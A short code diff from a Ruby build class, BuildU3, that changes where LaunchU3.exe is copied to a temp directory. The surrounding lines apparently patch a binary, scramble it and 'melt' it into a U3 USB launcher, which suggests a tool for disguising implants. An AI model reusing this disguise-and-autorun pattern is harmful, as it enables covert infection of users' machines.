@@ -24,7 +24,7 @@ class BuildU3 < Build
     build.patch params['binary'].dup
     build.scramble
 
-    FileUtils.cp path('u3/LaunchU3.exe'), File.join(Dir.tmpdir, 'LaunchU3.exe')
+    FileUtils.cp path('u3/LaunchU3.exe'), Config.instance.temp('LaunchU3.exe')
     melt = params['melt'].dup
     melt['input'] = 'LaunchU3.exe'
 
